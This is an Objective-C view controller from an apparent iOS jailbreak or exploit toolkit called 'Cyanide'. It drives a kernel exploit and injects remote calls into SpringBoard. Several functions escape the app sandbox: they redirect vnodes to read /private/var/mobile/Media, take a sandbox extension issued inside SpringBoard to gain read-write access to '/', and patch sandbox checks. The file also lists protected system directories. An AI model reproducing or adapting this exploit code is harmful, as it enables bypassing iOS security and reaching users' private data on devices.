//
//  ViewController.m
//  Cyanide
//
//  Created by seo on 3/24/26.
//

#import "ViewController.h"
#import "LogTextView.h"
#import "SettingsViewController.h"
#import "kexploit/kexploit_opa334.h"
#import "kexploit/krw.h"
#import "kexploit/kutils.h"
#import "kexploit/vnode.h"
#import "kexploit/offsets.h"
#import "kpf/patchfinder.h"
#import "utils/hexdump.h"
#import "utils/process.h"
#import "utils/file.h"
#import "utils/sandbox.h"
#import "TaskRop/RemoteCall.h"
#import "TaskRop/PAC.h"
#import "research/amfi_research.h"
#import "research/vnode_research.h"
#import "research/sandbox_research.h"


#import <sys/mount.h>
#import <sys/stat.h>
#import <copyfile.h>
#import <dlfcn.h>
#import <strings.h>

static uint64_t remote_alloc_str(const char *str)
{
    uint64_t len = strlen(str) + 1;
    uint64_t buf = do_remote_call_stable(5, "malloc", len, 0,0,0,0,0,0,0);
    if (buf) remote_writeStr(buf, str);
    return buf;
}

static uint64_t remote_sel(const char *name)
{
    uint64_t str = remote_alloc_str(name);
    uint64_t sel = do_remote_call_stable(5, "sel_registerName", str, 0,0,0,0,0,0,0);
    do_remote_call_stable(5, "free", str, 0,0,0,0,0,0,0);
    return sel;
}

static uint64_t remote_getClass(const char *name)
{
    uint64_t str = remote_alloc_str(name);
    uint64_t cls = do_remote_call_stable(5, "objc_getClass", str, 0,0,0,0,0,0,0);
    do_remote_call_stable(5, "free", str, 0,0,0,0,0,0,0);
    return cls;
}

static uint64_t remote_msg(uint64_t obj, uint64_t sel,
    uint64_t a0, uint64_t a1, uint64_t a2, uint64_t a3)
{
    return do_remote_call_stable(5, "objc_msgSend",
        obj, sel, a0, a1, a2, a3, 0, 0);
}

void five_icon_dock(void)
{
    init_remote_call("SpringBoard", false);
    printf("[5ICON] Starting...\n");

    uint64_t selShared    = remote_sel("sharedInstance");
    uint64_t selIconMgr   = remote_sel("iconManager");
    uint64_t selDockView  = remote_sel("dockListView");
    uint64_t selModel     = remote_sel("model");
    uint64_t selModel2    = remote_sel("iconListModel");
    uint64_t selGridGet   = remote_sel("gridSize");
    uint64_t selGridSet   = remote_sel("setGridSize:");
    uint64_t selLayout    = remote_sel("layout");
    uint64_t selLayoutCfg = remote_sel("layoutConfiguration");
    uint64_t selSetCols   = remote_sel("setNumberOfPortraitColumns:");
    uint64_t selPerform   = remote_sel("performSelectorOnMainThread:withObject:waitUntilDone:");
    uint64_t selSetNeedsLayout = remote_sel("setNeedsLayout");

    printf("[5ICON] Selectors registered\n");
    usleep(100000);  // 100ms — 런타임 락 안정화 대기

    // Step 1: SBIconController 클래스 → sharedInstance
    uint64_t cls = remote_getClass("SBIconController");
    if (!cls) { printf("[5ICON] SBIconController not found\n"); return; }
    usleep(50000);

    uint64_t ctrl = remote_msg(cls, selShared, 0,0,0,0);
    if (!ctrl) { printf("[5ICON] sharedInstance failed\n"); return; }
    printf("[5ICON] ctrl = 0x%llx\n", ctrl);
    usleep(50000);

    // Step 2: iconManager → dockListView
    uint64_t mgr = remote_msg(ctrl, selIconMgr, 0,0,0,0);
    usleep(50000);

    uint64_t dock = 0;
    if (mgr) dock = remote_msg(mgr, selDockView, 0,0,0,0);
    if (!dock) dock = remote_msg(ctrl, selDockView, 0,0,0,0);
    if (!dock) { printf("[5ICON] dockListView not found\n"); return; }
    printf("[5ICON] dock = 0x%llx\n", dock);
    usleep(50000);

    // Step 3: model → setGridSize: (columns = 5)
    uint64_t model = remote_msg(dock, selModel, 0,0,0,0);
    if (!model) model = remote_msg(dock, selModel2, 0,0,0,0);
    if (model) {
        uint64_t oldGrid = remote_msg(model, selGridGet, 0,0,0,0) & 0xFFFFFFFF;
        uint64_t newGrid = (oldGrid & 0xFFFF0000) | 5;
        usleep(50000);
        remote_msg(model, selGridSet, newGrid, 0,0,0);
        printf("[5ICON] gridSize 0x%llx -> 0x%llx\n", oldGrid, newGrid);
    }
    usleep(50000);

    // Step 4: layout → layoutConfiguration → setNumberOfPortraitColumns: 5
    uint64_t layout = remote_msg(dock, selLayout, 0,0,0,0);
    if (layout) {
        usleep(50000);
        uint64_t cfg = remote_msg(layout, selLayoutCfg, 0,0,0,0);
        if (cfg) {
            usleep(50000);
            remote_msg(cfg, selSetCols, 5, 0,0,0);
            printf("[5ICON] portraitColumns -> 5\n");
        }
    }
    usleep(50000);

    // [dock performSelectorOnMainThread:@selector(setNeedsLayout) withObject:nil waitUntilDone:NO]
    remote_msg(dock, selPerform, selSetNeedsLayout, 0 /*nil*/, 0 /*NO*/, 0);

    printf("[5ICON] done\n");
    destroy_remote_call();
}

int escape_sbx_demo(void) {
    NSString *mountPath = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/sbx_escaped"];
    [[NSFileManager defaultManager] removeItemAtPath:mountPath error:nil];
    [[NSFileManager defaultManager] createDirectoryAtPath:mountPath withIntermediateDirectories:NO attributes:nil error:nil];
    
    uint64_t orig_to_v_data = vnode_redirect_folder(mountPath.UTF8String, "/private/var/mobile/Media");
        
    NSArray *folderContents = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mountPath error:nil];
    for (NSString *fileName in folderContents) {
        NSLog(@"fileName: %@", fileName);
    }
    vnode_unredirect_folder(mountPath.UTF8String, orig_to_v_data);
    
    return 0;
}

extern uint64_t g_kernel_slide;
extern uint64_t g_RC_trojanMem;
extern int64_t sandbox_extension_consume(const char *extension_token);
int escape_sbx_demo2_in_session(void) {
    uint64_t memRemote = g_RC_trojanMem;
    if (!memRemote) {
        printf("[%s:%d] no active remote-call session\n", __FUNCTION__, __LINE__);
        return -1;
    }

    uint64_t pathRemote = memRemote;
    remote_writeStr(pathRemote, "/");
    
    const char* appSandboxReadExt = "com.apple.app-sandbox.read-write";
    uint64_t sandboxExtensionEntry = memRemote + 0x100;
    remote_writeStr(sandboxExtensionEntry, appSandboxReadExt);
    
    uint64_t tokenRemote = do_remote_call_stable(1000, "sandbox_extension_issue_file", sandboxExtensionEntry, pathRemote, 0, 0, 0, 0, 0, 0);
    printf("[%s:%d] tokenRemote = 0x%llx\n", __FUNCTION__, __LINE__, tokenRemote);
    if (!tokenRemote) {
        printf("[%s:%d] sandbox_extension_issue_file failed\n", __FUNCTION__, __LINE__);
        return -1;
    }
    
    
    char token[0x4000];
    memset(token, 0, 0x4000);
    if (!remote_read(tokenRemote, token, 0x4000)) {
        printf("[%s:%d] failed to read sandbox token\n", __FUNCTION__, __LINE__);
        do_remote_call_stable(100, "free", tokenRemote, 0, 0, 0, 0, 0, 0, 0);
        return -1;
    }
    do_remote_call_stable(100, "free", tokenRemote, 0, 0, 0, 0, 0, 0, 0);
    printf("[%s:%d] Got token = %s\n", __FUNCTION__, __LINE__, token);
    
    int64_t handle = sandbox_extension_consume(token);
    if(handle < 0) {
        printf("[%s:%d] sandbox_extension_consume failed, ret = 0x%llx\n", __FUNCTION__, __LINE__, handle);
        return -1;
    }
    printf("[%s:%d] sandbox_extension_consume success handle=0x%llx\n", __FUNCTION__, __LINE__, handle);

    return 0;
}

int escape_sbx_demo2(void) {
    const char* target = "SpringBoard";
    if (init_remote_call(target, false) != 0) {
        return -1;
    }

    int ret = escape_sbx_demo2_in_session();
    destroy_remote_call();
    return ret;
}

int escape_sbx_demo3(void) {
    if(patch_sandbox_ext() == 0) {
        printf("successfully patched sbx extension\n");
    } else {
        printf("failed to patch sbx extension...\n");
    }
    return 0;
}



@interface ViewController ()
@property (strong, nonatomic) IBOutlet UITextView *logView;

@end

@implementation ViewController


- (void)viewDidLoad {
    [super viewDidLoad];

    if ([[NSUserDefaults standardUserDefaults] boolForKey:kSettingsAutoRunKexploit]) {
        settings_run_actions();
    }

    return;
    // Do any additional setup after loading the view.
    
//    kexploit_opa334();
//    escape_sbx_demo2();
//    return;
    kexploit_opa334();
//    escape_sbx_demo3();
//    research_sandbox(proc_find_by_name("calaccessd"));
    borrow_sandbox_ext("sysdiagnosed");
//    escape_sbx_demo2();
    research_sandbox(proc_self());
    
//    research_amfi(proc_self());
//    research_amfi(proc_find_by_name("misd"));
    
    
    
    
    printf("Listing /var/mobile ...\n");
    NSArray *folderContents = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var/mobile" error:nil];
    for (NSString *fileName in folderContents) {
        printf("%s\n", fileName.UTF8String);
    }
    puts("");
    
    printf("Listing /var/containers/Bundle/Application ...\n");
    folderContents = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var/containers/Bundle/Application" error:nil];
    for (NSString *fileName in folderContents) {
        printf("%s\n", fileName.UTF8String);
    }
    puts("");
    
    printf("Listing /var/ ...\n");
    folderContents = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var" error:nil];
    for (NSString *fileName in folderContents) {
        printf("%s\n", fileName.UTF8String);
    }
    puts("");
}


@end
